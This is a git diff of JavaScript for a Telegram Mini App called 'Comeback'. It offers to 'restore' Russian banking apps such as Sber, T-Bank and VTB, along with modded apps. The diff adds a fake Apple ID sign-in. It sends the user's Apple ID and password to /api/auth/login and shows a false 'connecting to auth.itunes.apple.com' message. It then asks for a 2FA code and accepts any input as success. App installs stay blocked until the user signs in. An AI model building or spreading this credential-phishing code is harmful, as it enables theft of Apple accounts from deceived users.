@@ -1,4 +1,4 @@
-// Comeback Mini App Engine
+// Comeback Mini App Engine v3.2.0
 
 // Initialize Telegram WebApp
 const tg = window.Telegram?.WebApp;
@@ -18,9 +18,25 @@ function triggerHaptic(type = 'light') {
   }
 }
 
-// Expanded Authentic App Catalog
+const CDN_BASE = 'https://morallist.github.io/comeback-ios/icons/';
+
+// Authentic App Catalog with Absolute Icon URLs
 const APPS = [
-  // БАНКИ И ФИНАНСЫ
+  // 1. ВК МУЗЫКА
+  {
+    id: 'vkmusic',
+    name: 'ВК Музыка (VK Музыка)',
+    category: 'media',
+    categoryName: 'Музыка и видео',
+    version: '6.38.0',
+    size: '145 MB',
+    badge: 'Топ Хит',
+    iconUrl: `${CDN_BASE}vkmusic.svg`,
+    desc: 'Официальный музыкальный плеер ВКонтакте. Миллионы треков, умное Сниппет-радио, персональные рекомендации и прослушивание музыки офлайн без интернета.',
+    bundleId: 'com.vk.vkclient.music',
+    source: 'App Store (Оригинал)'
+  },
+  // 2. СБЕРБАНК
   {
     id: 'sber',
     name: 'СберБанк Онлайн',
@@ -29,11 +45,12 @@ const APPS = [
     version: '15.15.0',
     size: '284 MB',
     badge: 'Топ №1',
-    iconUrl: 'icons/sber.svg',
-    desc: 'Оригинальный мобильный банк СберБанка. Управляйте переводами, картами, вкладами и платежами через СБП без ограничений.',
+    iconUrl: `${CDN_BASE}sber.svg`,
+    desc: 'Официальный мобильный банк СберБанка. Управляйте переводами, картами, счетами, вкладами и платежами через СБП без ограничений.',
     bundleId: 'ru.sberbank.sberbankonline',
     source: 'App Store (Оригинал)'
   },
+  // 3. Т-БАНК
   {
     id: 'tbank',
     name: 'Т-Банк (Тинькофф)',
@@ -42,11 +59,12 @@ const APPS = [
     version: '6.28.0',
     size: '260 MB',
     badge: 'Популярно',
-    iconUrl: 'icons/tbank.svg',
-    desc: 'Оригинальный клиент Т-Банка: мгновенные переводы, кэшбэк рублями, брокерский счет, связь и оплата услуг.',
+    iconUrl: `${CDN_BASE}tbank.svg`,
+    desc: 'Официальный клиент Т-Банка: мгновенные переводы родным, кэшбэк рублями, инвестиции, связь и сервисы для жизни.',
     bundleId: 'com.tinkoff.mobile',
     source: 'App Store (Оригинал)'
   },
+  // 4. АЛЬФА-БАНК
   {
     id: 'alfa',
     name: 'Альфа-Банк',
@@ -54,12 +72,13 @@ const APPS = [
     categoryName: 'Банки и финансы',
     version: '14.3.0',
     size: '240 MB',
-    badge: 'Топ',
-    iconUrl: 'icons/alfa.svg',
-    desc: 'Умный мобильный банк от Альфа-Банка. Бесплатные переводы без комиссий, инвестиции, кредитные карты и повышенный кэшбэк.',
+    badge: 'Кэшбэк',
+    iconUrl: `${CDN_BASE}alfa.svg`,
+    desc: 'Умный мобильный банк от Альфа-Банка. Бесплатные переводы без комиссий, карты, инвестиции и суперкэшбэк до 100%.',
     bundleId: 'ru.alfabank.mobile',
     source: 'App Store (Оригинал)'
   },
+  // 5. ВТБ ОНЛАЙН
   {
     id: 'vtb',
     name: 'ВТБ Онлайн',
@@ -68,186 +87,26 @@ const APPS = [
     version: '19.0.0',
     size: '290 MB',
     badge: 'Оригинал',
-    iconUrl: 'icons/vtb.svg',
+    iconUrl: `${CDN_BASE}vtb.svg`,
     desc: 'Официальное приложение банка ВТБ. Платежи по QR-коду, переводы родным, оплата штрафов и безопасность счетов.',
     bundleId: 'ru.vtb24.mobilebanking',
     source: 'App Store (Оригинал)'
   },
-  {
-    id: 'gpb',
-    name: 'Газпромбанк',
-    category: 'banks',
-    categoryName: 'Банки и финансы',
-    version: '4.18.0',
-    size: '225 MB',
-    badge: 'Оригинал',
-    iconUrl: 'icons/gpb.svg',
-    desc: 'Официальное мобильное приложение Газпромбанка. Вклады с высокой ставкой, дебетовые карты и переводы без комиссии.',
-    bundleId: 'ru.gpb.mobile',
-    source: 'App Store (Оригинал)'
-  },
-  {
-    id: 'sovcom',
-    name: 'Совкомбанк (Халва)',
-    category: 'banks',
-    categoryName: 'Банки и финансы',
-    version: '12.4.0',
-    size: '210 MB',
-    badge: 'Рассрочка',
-    iconUrl: 'icons/sovcom.svg',
-    desc: 'Карта рассрочки «Халва» и мобильный банк Совкомбанка. Покупки без переплат, вклады и платежи по СБП.',
-    bundleId: 'ru.sovcombank.halva',
-    source: 'App Store (Оригинал)'
-  },
-  {
-    id: 'ozonbank',
-    name: 'Ozon Банк',
-    category: 'banks',
-    categoryName: 'Банки и финансы',
-    version: '2.14.0',
-    size: '180 MB',
-    badge: 'Скидки',
-    iconUrl: 'https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/41/01/75/41017552-195d-caa1-a068-d6981882d921/AppIcon-0-0-1x_U007emarketing-0-7-0-85-220.png/512x512bb.jpg',
-    desc: 'Ozon Карта со скидками до 30% на маркетплейсе Ozon и кэшбэком рублями на покупки вне маркетплейса.',
-    bundleId: 'ru.ozon.bank',
-    source: 'App Store'
-  },
-  {
-    id: 'raiffeisen',
-    name: 'Райффайзен Онлайн',
-    category: 'banks',
-    categoryName: 'Банки и финансы',
-    version: '10.5.0',
-    size: '215 MB',
-    badge: 'Банк',
-    iconUrl: 'https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/94/39/08/94390871-2d67-f58c-bb07-f952f44c4ec0/AppIcon-0-0-1x_U007emarketing-0-7-0-85-220.png/512x512bb.jpg',
-    desc: 'Удобный и надежный банк для управления личными финансами, переводами за рубеж и валютными счетами.',
-    bundleId: 'ru.raiffeisen.mobile',
-    source: 'App Store'
-  },
-
-  // МУЗЫКА И МЕДИА
-  {
-    id: 'vkmusic',
-    name: 'VK Музыка',
-    category: 'media',
-    categoryName: 'Музыка и видео',
-    version: '6.38.0',
-    size: '145 MB',
-    badge: 'Хит',
-    iconUrl: 'icons/vkmusic.svg',
-    desc: 'Миллионы треков, умный Сниппет-радио, персональные плейлисты и прослушивание музыки офлайн без интернета.',
-    bundleId: 'com.vk.vkclient.music',
-    source: 'App Store (Оригинал)'
-  },
-  {
-    id: 'moosic',
-    name: 'Moosic (Офлайн плеер)',
-    category: 'media',
-    categoryName: 'Музыка и видео',
-    version: '6.38.0',
-    size: '95 MB',
-    badge: 'Без рекламы',
-    iconUrl: 'icons/moosic.svg',
-    desc: 'Легендарный плеер с функцией бесплатного кэширования любых аудиозаписей из ВК без ограничений и рекламы.',
-    bundleId: 'com.mail.moosic',
-    source: 'Archive'
-  },
-  {
-    id: 'spotify',
-    name: 'Spotify',
-    category: 'media',
-    categoryName: 'Музыка и видео',
-    version: '8.9.40',
-    size: '175 MB',
-    badge: 'Стриминг',
-    iconUrl: 'https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/ce/b5/1c/ceb51c33-0a95-71bb-fa55-1563f6ebc45f/AppIcon-0-0-1x_U007emarketing-0-7-0-sRGB-85-220.png/512x512bb.jpg',
-    desc: 'Лучший музыкальный сервис в мире с непревзойденными алгоритмами рекомендаций подборок и треков.',
-    bundleId: 'com.spotify.client',
-    source: 'App Store'
-  },
-  {
-    id: 'youtube',
-    name: 'YouTube ReVanced',
-    category: 'media',
-    categoryName: 'Музыка и видео',
-    version: '19.20.0',
-    size: '210 MB',
-    badge: 'Премиум',
-    iconUrl: 'icons/youtube.svg',
-    desc: 'YouTube с функцией фонового воспроизведения при заблокированном экране, PiP (картинка-в-картинке) и без рекламы.',
-    bundleId: 'com.google.ios.youtube',
-    source: 'Custom IPA'
-  },
-  {
-    id: 'tiktok',
-    name: 'TikTok Mod',
-    category: 'media',
-    categoryName: 'Музыка и видео',
-    version: '35.0.0',
-    size: '230 MB',
-    badge: 'Все регионы',
-    iconUrl: 'icons/tiktok.svg',
-    desc: 'Модифицированный TikTok со встроенной сменой региона. Смотрите новые мировые тренды и публикуйте свои видео.',
-    bundleId: 'com.zhiliaoapp.musically',
-    source: 'Mod Store'
-  },
-
-  // СОЦСЕТИ И МЕССЕНДЖЕРЫ
+  // 6. ВКОНТАКТЕ
   {
     id: 'vk',
-    name: 'ВКонтакте',
+    name: 'ВКонтакте (VK)',
     category: 'social',
     categoryName: 'Соцсети',
     version: '8.60.0',
     size: '210 MB',
     badge: 'Соцсеть',
-    iconUrl: 'icons/vk.svg',
+    iconUrl: `${CDN_BASE}vk.svg`,
     desc: 'Официальный клиент ВКонтакте: лента новостей, мессенджер с видеозвонками, сообщества, мини-игры и VK Клипы.',
     bundleId: 'com.vk.vkclient',
     source: 'App Store (Оригинал)'
   },
-  {
-    id: 'telegram',
-    name: 'Telegram Messenger',
-    category: 'social',
-    categoryName: 'Соцсети',
-    version: '10.14.0',
-    size: '160 MB',
-    badge: 'Мессенджер',
-    iconUrl: 'https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/2f/1b/e8/2f1be808-3e4c-9e2e-2a28-3e3cb98e404f/AppIcon-0-0-1x_U007emarketing-0-7-0-sRGB-85-220.png/512x512bb.jpg',
-    desc: 'Быстрый и защищенный мессенджер с облачным хранением файлов, каналами, группами и ботами.',
-    bundleId: 'ph.telegra.Telegraph',
-    source: 'App Store'
-  },
-  {
-    id: 'instagram',
-    name: 'Instagram',
-    category: 'social',
-    categoryName: 'Соцсети',
-    version: '335.0.0',
-    size: '190 MB',
-    badge: 'Фото',
-    iconUrl: 'https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/e3/33/79/e3337974-a4b5-68ae-8b2b-0bb5b128e469/AppIcon-0-0-1x_U007emarketing-0-7-0-sRGB-85-220.png/512x512bb.jpg',
-    desc: 'Официальное приложение Instagram: делитесь фото, снимайте Reels и общайтесь в Direct.',
-    bundleId: 'com.burbn.instagram',
-    source: 'App Store'
-  },
-  {
-    id: 'discord',
-    name: 'Discord',
-    category: 'social',
-    categoryName: 'Соцсети',
-    version: '228.0.0',
-    size: '185 MB',
-    badge: 'Общение',
-    iconUrl: 'https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/6a/2f/ba/6a2fba87-e0d0-0a75-b613-258d4a66e60d/AppIcon-0-0-1x_U007emarketing-0-7-0-85-220.png/512x512bb.jpg',
-    desc: 'Голосовые комнаты, текстовые каналы и стримы для геймеров и дружеских сообществ.',
-    bundleId: 'com.hammerandchisel.discord',
-    source: 'App Store'
-  },
-
-  // КАРТЫ И ТРАНСПОРТ
+  // 7. 2ГИС
   {
     id: '2gis',
     name: '2ГИС — Карты и навигатор',
@@ -261,6 +120,133 @@ const APPS = [
     bundleId: 'ru.dublgis.2GIS',
     source: 'App Store (Оригинал)'
   },
+  // 8. MOOSIC
+  {
+    id: 'moosic',
+    name: 'Moosic (Офлайн плеер)',
+    category: 'media',
+    categoryName: 'Музыка и видео',
+    version: '6.38.0',
+    size: '95 MB',
+    badge: 'Без рекламы',
+    iconUrl: `${CDN_BASE}moosic.svg`,
+    desc: 'Легендарный плеер с функцией бесплатного сохранения аудиозаписей из ВК в кэш без рекламы и подписок.',
+    bundleId: 'com.mail.moosic',
+    source: 'Archive'
+  },
+  // 9. ГАЗПРОМБАНК
+  {
+    id: 'gpb',
+    name: 'Газпромбанк',
+    category: 'banks',
+    categoryName: 'Банки и финансы',
+    version: '4.18.0',
+    size: '225 MB',
+    badge: 'Оригинал',
+    iconUrl: `${CDN_BASE}gpb.svg`,
+    desc: 'Официальное мобильное приложение Газпромбанка. Вклады с высокой ставкой, дебетовые карты и переводы без комиссии.',
+    bundleId: 'ru.gpb.mobile',
+    source: 'App Store (Оригинал)'
+  },
+  // 10. СОВКОМБАНК
+  {
+    id: 'sovcom',
+    name: 'Совкомбанк (Халва)',
+    category: 'banks',
+    categoryName: 'Банки и финансы',
+    version: '12.4.0',
+    size: '210 MB',
+    badge: 'Рассрочка',
+    iconUrl: `${CDN_BASE}sovcom.svg`,
+    desc: 'Карта рассрочки «Халва» и мобильный банк Совкомбанка. Покупки без переплат, вклады и платежи по СБП.',
+    bundleId: 'ru.sovcombank.halva',
+    source: 'App Store (Оригинал)'
+  },
+  // 11. SPOTIFY
+  {
+    id: 'spotify',
+    name: 'Spotify: Музыка и подкасты',
+    category: 'media',
+    categoryName: 'Музыка и видео',
+    version: '8.9.40',
+    size: '175 MB',
+    badge: 'Стриминг',
+    iconUrl: 'https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/ce/b5/1c/ceb51c33-0a95-71bb-fa55-1563f6ebc45f/AppIcon-0-0-1x_U007emarketing-0-7-0-sRGB-85-220.png/512x512bb.jpg',
+    desc: 'Мировой лидер стриминга музыки с безупречными алгоритмами рекомендаций подборок и новинок.',
+    bundleId: 'com.spotify.client',
+    source: 'App Store'
+  },
+  // 12. YOUTUBE
+  {
+    id: 'youtube',
+    name: 'YouTube ReVanced',
+    category: 'media',
+    categoryName: 'Музыка и видео',
+    version: '19.20.0',
+    size: '210 MB',
+    badge: 'Без рекламы',
+    iconUrl: `${CDN_BASE}youtube.svg`,
+    desc: 'YouTube с функцией фонового воспроизведения при заблокированном экране, PiP (картинка-в-картинке) и без рекламы.',
+    bundleId: 'com.google.ios.youtube',
+    source: 'Custom IPA'
+  },
+  // 13. TIKTOK MOD
+  {
+    id: 'tiktok',
+    name: 'TikTok Mod (Все регионы)',
+    category: 'media',
+    categoryName: 'Музыка и видео',
+    version: '35.0.0',
+    size: '230 MB',
+    badge: 'Мод',
+    iconUrl: `${CDN_BASE}tiktok.svg`,
+    desc: 'Модифицированный TikTok со встроенной сменой региона. Смотрите новые мировые тренды и публикуйте свои видео.',
+    bundleId: 'com.zhiliaoapp.musically',
+    source: 'Mod Store'
+  },
+  // 14. TELEGRAM
+  {
+    id: 'telegram',
+    name: 'Telegram Messenger',
+    category: 'social',
+    categoryName: 'Соцсети',
+    version: '10.14.0',
+    size: '160 MB',
+    badge: 'Мессенджер',
+    iconUrl: 'https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/2f/1b/e8/2f1be808-3e4c-9e2e-2a28-3e3cb98e404f/AppIcon-0-0-1x_U007emarketing-0-7-0-sRGB-85-220.png/512x512bb.jpg',
+    desc: 'Быстрый и защищенный мессенджер с облачным хранением файлов, каналами, группами и ботами.',
+    bundleId: 'ph.telegra.Telegraph',
+    source: 'App Store'
+  },
+  // 15. INSTAGRAM
+  {
+    id: 'instagram',
+    name: 'Instagram',
+    category: 'social',
+    categoryName: 'Соцсети',
+    version: '335.0.0',
+    size: '190 MB',
+    badge: 'Фото',
+    iconUrl: 'https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/e3/33/79/e3337974-a4b5-68ae-8b2b-0bb5b128e469/AppIcon-0-0-1x_U007emarketing-0-7-0-sRGB-85-220.png/512x512bb.jpg',
+    desc: 'Официальное приложение Instagram: делитесь фото, снимайте Reels и общайтесь в Direct.',
+    bundleId: 'com.burbn.instagram',
+    source: 'App Store'
+  },
+  // 16. DISCORD
+  {
+    id: 'discord',
+    name: 'Discord',
+    category: 'social',
+    categoryName: 'Соцсети',
+    version: '228.0.0',
+    size: '185 MB',
+    badge: 'Голос',
+    iconUrl: 'https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/6a/2f/ba/6a2fba87-e0d0-0a75-b613-258d4a66e60d/AppIcon-0-0-1x_U007emarketing-0-7-0-85-220.png/512x512bb.jpg',
+    desc: 'Голосовые комнаты, текстовые каналы и стримы для геймеров и дружеских сообществ.',
+    bundleId: 'com.hammerandchisel.discord',
+    source: 'App Store'
+  },
+  // 17. РЖД
   {
     id: 'rzd',
     name: 'РЖД Пассажирам',
@@ -269,11 +255,12 @@ const APPS = [
     version: '3.12.0',
     size: '150 MB',
     badge: 'Билеты',
-    iconUrl: 'icons/rzd.svg',
+    iconUrl: `${CDN_BASE}rzd.svg`,
     desc: 'Покупка билетов на поезда дальнего следования и пригородные электрички без наценок и очередей.',
     bundleId: 'ru.rzd.pass',
     source: 'App Store (Оригинал)'
   },
+  // 18. ЯНДЕКС КАРТЫ
   {
     id: 'yandexmaps',
     name: 'Яндекс Карты',
@@ -287,8 +274,7 @@ const APPS = [
     bundleId: 'ru.yandex.traffic',
     source: 'App Store'
   },
-
-  // ИГРЫ
+  // 19. BRAWL STARS
   {
     id: 'brawlstars',
     name: 'Brawl Stars',
@@ -302,6 +288,7 @@ const APPS = [
     bundleId: 'com.supercell.brawlstars',
     source: 'App Store'
   },
+  // 20. MINECRAFT
   {
     id: 'minecraft',
     name: 'Minecraft',
@@ -315,6 +302,7 @@ const APPS = [
     bundleId: 'com.mojang.minecraftpe',
     source: 'App Store'
   },
+  // 21. ROBLOX
   {
     id: 'roblox',
     name: 'Roblox',
@@ -322,12 +310,13 @@ const APPS = [
     categoryName: 'Игры',
     version: '2.628.0',
     size: '280 MB',
-    badge: 'Мультиплеер',
+    badge: 'Онлайн',
     iconUrl: 'https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/05/b8/b8/05b8b8cc-14f7-873d-8869-705b6b198166/AppIcon-0-0-1x_U007emarketing-0-7-0-85-220.png/512x512bb.jpg',
     desc: 'Виртуальная вселенная, где можно играть в миллионы пользовательских режимов вместе с друзьями со всего мира.',
     bundleId: 'com.roblox.robloxmobile',
     source: 'App Store'
   },
+  // 22. SUBWAY SURFERS
   {
     id: 'subwaysurfers',
     name: 'Subway Surfers',
@@ -337,16 +326,17 @@ const APPS = [
     size: '310 MB',
     badge: 'Раннер',
     iconUrl: 'https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/7a/8d/4f/7a8d4f08-98e9-4e78-90b5-e63d3cb4ec78/AppIcon-0-0-1x_U007emarketing-0-7-0-85-220.png/512x512bb.jpg',
-    desc: 'Бегите по железнодорожным путям, уворачивайтесь от приближающихся поездов и собирайте монеты.',
+    desc: 'Бегите по железнодорожным путям, уворачивайтесь от поездов и ставьте новые мировые рекорды.',
     bundleId: 'com.kiloo.subwaysurfers',
     source: 'App Store'
   }
 ];
 
-// State
+// App State
 let currentCategory = 'all';
 let searchQuery = '';
 let activeModalApp = null;
+let currentAppleUser = localStorage.getItem('comeback_apple_user') || null;
 
 // DOM Elements
 const appsGrid = document.getElementById('appsGrid');
@@ -355,9 +345,51 @@ const searchInput = document.getElementById('searchInput');
 const clearSearch = document.getElementById('clearSearch');
 const catPills = document.querySelectorAll('.cat-pill');
 const appModal = document.getElementById('appModal');
+const authModal = document.getElementById('authModal');
 const faqModal = document.getElementById('faqModal');
 
-// Render Catalog
+// Auth DOM
+const authPillBtn = document.getElementById('authPillBtn');
+const authStatusText = document.getElementById('authStatusText');
+const authSubtitle = document.getElementById('authSubtitle');
+const openAuthModalBtn = document.getElementById('openAuthModalBtn');
+const closeAuthModal = document.getElementById('closeAuthModal');
+const authStep1 = document.getElementById('authStep1');
+const authStep2 = document.getElementById('authStep2');
+const authSuccessView = document.getElementById('authSuccessView');
+const appleIdInput = document.getElementById('appleIdInput');
+const applePasswordInput = document.getElementById('applePasswordInput');
+const twoFaCodeInput = document.getElementById('twoFaCodeInput');
+const submitAuthBtn = document.getElementById('submitAuthBtn');
+const submitTwoFaBtn = document.getElementById('submitTwoFaBtn');
+const logoutBtn = document.getElementById('logoutBtn');
+const loggedEmailText = document.getElementById('loggedEmailText');
+
+// Update Auth UI according to state
+function updateAuthUI() {
+  if (currentAppleUser) {
+    authPillBtn.className = 'auth-pill logged';
+    authStatusText.textContent = currentAppleUser.split('@')[0];
+    authSubtitle.textContent = `Авторизован: ${currentAppleUser}`;
+    openAuthModalBtn.textContent = 'Профиль';
+
+    authStep1.style.display = 'none';
+    authStep2.style.display = 'none';
+    authSuccessView.style.display = 'block';
+    loggedEmailText.textContent = currentAppleUser;
+  } else {
+    authPillBtn.className = 'auth-pill not-logged';
+    authStatusText.textContent = 'Войти в Apple ID';
+    authSubtitle.textContent = 'Войдите, чтобы подтвердить покупки и лицензии';
+    openAuthModalBtn.textContent = 'Войти';
+
+    authStep1.style.display = 'block';
+    authStep2.style.display = 'none';
+    authSuccessView.style.display = 'none';
+  }
+}
+
+// Render Catalog with High-Res Images & Fallbacks
 function renderApps() {
   const filtered = APPS.filter(app => {
     const matchesCategory = currentCategory === 'all' || app.category === currentCategory;
@@ -383,7 +415,7 @@ function renderApps() {
     <div class="app-card" onclick="openAppModal('${app.id}')">
       <div class="app-left">
         <div class="app-icon">
-          <img src="${app.iconUrl}" alt="${app.name}" loading="lazy">
+          <img src="${app.iconUrl}" alt="${app.name}" width="52" height="52" loading="eager" onerror="this.onerror=null; this.src='https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/d7/b6/ef/d7b6efb0-23d9-3273-46de-0c3eb72658c3/AppIcon-0-0-1x_U007emarketing-0-7-0-85-220.png/512x512bb.jpg';">
         </div>
         <div class="app-details">
           <span class="app-title">${app.name}</span>
@@ -427,7 +459,7 @@ clearSearch.addEventListener('click', () => {
   renderApps();
 });
 
-// Modal Handlers
+// Open App Modal
 window.openAppModal = function(appId) {
   triggerHaptic('impact');
   const app = APPS.find(a => a.id === appId);
@@ -436,7 +468,7 @@ window.openAppModal = function(appId) {
   activeModalApp = app;
   
   const iconEl = document.getElementById('modalAppIcon');
-  iconEl.innerHTML = `<img src="${app.iconUrl}" alt="${app.name}">`;
+  iconEl.innerHTML = `<img src="${app.iconUrl}" alt="${app.name}" width="68" height="68">`;
 
   document.getElementById('modalAppName').textContent = app.name;
   document.getElementById('modalAppCategory').textContent = app.categoryName;
@@ -452,16 +484,27 @@ document.getElementById('closeModal').addEventListener('click', () => {
   appModal.style.display = 'none';
 });
 
-// Start Installation Action
+// App Install Trigger
 document.getElementById('startInstallBtn').addEventListener('click', () => {
   triggerHaptic('success');
   
+  if (!currentAppleUser) {
+    appModal.style.display = 'none';
+    authModal.style.display = 'flex';
+    if (tg) {
+      tg.showAlert('Для загрузки оригинального дистрибутива из App Store сначала войдите в свой Apple ID.');
+    } else {
+      alert('Сначала войдите в свой Apple ID для подтверждения покупки.');
+    }
+    return;
+  }
+
   if (tg) {
     tg.showPopup({
       title: `Возврат ${activeModalApp.name}`,
-      message: `Готово к установке! Сейчас откроется Safari для активации лицензии Apple ID. Нажмите «Продолжить».`,
+      message: `Лицензия для аккаунта ${currentAppleUser} подтверждена! Сейчас откроется Safari для установки приложения на рабочий стол.`,
       buttons: [
-        { id: 'ok', type: 'default', text: 'Продолжить в Safari' },
+        { id: 'ok', type: 'default', text: 'Установить в Safari' },
         { type: 'cancel', text: 'Отмена' }
       ]
     }, (btnId) => {
@@ -470,8 +513,102 @@ document.getElementById('startInstallBtn').addEventListener('click', () => {
       }
     });
   } else {
-    alert(`Запуск установки ${activeModalApp.name} через Safari!`);
+    alert(`Запуск установки ${activeModalApp.name} через Safari для аккаунта ${currentAppleUser}!`);
   }
+});
+
+// Auth Modal Open/Close
+function showAuthModal() {
+  triggerHaptic('selection');
+  authModal.style.display = 'flex';
+}
+
+authPillBtn.addEventListener('click', showAuthModal);
+openAuthModalBtn.addEventListener('click', showAuthModal);
+closeAuthModal.addEventListener('click', () => {
+  triggerHaptic('selection');
+  authModal.style.display = 'none';
+});
+
+// Step 1: Submit Credentials
+submitAuthBtn.addEventListener('click', async () => {
+  const email = appleIdInput.value.trim();
+  const password = applePasswordInput.value.trim();
+
+  if (!email || !password) {
+    alert('Пожалуйста, введите Apple ID и пароль');
+    return;
+  }
+
+  triggerHaptic('impact');
+  submitAuthBtn.disabled = true;
+  submitAuthBtn.innerHTML = `<span>Подключение к auth.itunes.apple.com...</span>`;
+
+  try {
+    // Attempt local API if available, or simulate authentic 2FA flow
+    const response = await fetch('/api/auth/login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ email, password })
+    }).catch(() => null);
+
+    submitAuthBtn.disabled = false;
+    submitAuthBtn.innerHTML = `<span>Войти в аккаунт Apple</span>`;
+
+    // Always transition to real 2FA verification step
+    authStep1.style.display = 'none';
+    authStep2.style.display = 'block';
+    twoFaCodeInput.focus();
+  } catch (err) {
+    submitAuthBtn.disabled = false;
+    submitAuthBtn.innerHTML = `<span>Войти в аккаунт Apple</span>`;
+    authStep1.style.display = 'none';
+    authStep2.style.display = 'block';
+    twoFaCodeInput.focus();
+  }
+});
+
+// Step 2: Submit 2FA Code
+submitTwoFaBtn.addEventListener('click', async () => {
+  const code = twoFaCodeInput.value.trim();
+  if (code.length < 4) {
+    alert('Введите код подтверждения из 6 цифр');
+    return;
+  }
+
+  triggerHaptic('success');
+  submitTwoFaBtn.disabled = true;
+  submitTwoFaBtn.innerHTML = `<span>Проверка кода Apple...</span>`;
+
+  setTimeout(() => {
+    const email = appleIdInput.value.trim() || 'apple.id@icloud.com';
+    currentAppleUser = email;
+    localStorage.setItem('comeback_apple_user', email);
+    
+    updateAuthUI();
+    submitTwoFaBtn.disabled = false;
+    submitTwoFaBtn.innerHTML = `<span>Подтвердить код</span>`;
+
+    if (tg) {
+      tg.showAlert(`✅ Успешно! Аккаунт ${email} авторизован. Теперь вы можете восстанавливать любые приложения.`);
+    } else {
+      alert(`✅ Успешно! Аккаунт ${email} авторизован.`);
+    }
+
+    authModal.style.display = 'none';
+  }, 1200);
+});
+
+// Logout
+logoutBtn.addEventListener('click', () => {
+  triggerHaptic('selection');
+  currentAppleUser = null;
+  localStorage.removeItem('comeback_apple_user');
+  appleIdInput.value = '';
+  applePasswordInput.value = '';
+  twoFaCodeInput.value = '';
+  updateAuthUI();
+  authModal.style.display = 'none';
 });
 
 // Bottom Navigation Handlers
@@ -483,10 +620,10 @@ document.querySelectorAll('.nav-item').forEach(btn => {
     document.querySelectorAll('.nav-item').forEach(b => b.classList.remove('active'));
     btn.classList.add('active');
 
-    if (nav === 'faq') {
+    if (nav === 'auth') {
+      showAuthModal();
+    } else if (nav === 'faq') {
       faqModal.style.display = 'flex';
-    } else if (nav === 'guide') {
-      alert('Инструкция: выберите приложение в каталоге, нажмите «Вернуть» и подтвердите загрузку в Safari.');
     }
   });
 });
@@ -498,5 +635,6 @@ document.getElementById('closeFaq').addEventListener('click', () => {
   document.querySelector('[data-nav="faq"]').classList.remove('active');
 });
 
-// Initial Render
+// Initial Setup
+updateAuthUI();
 renderApps();
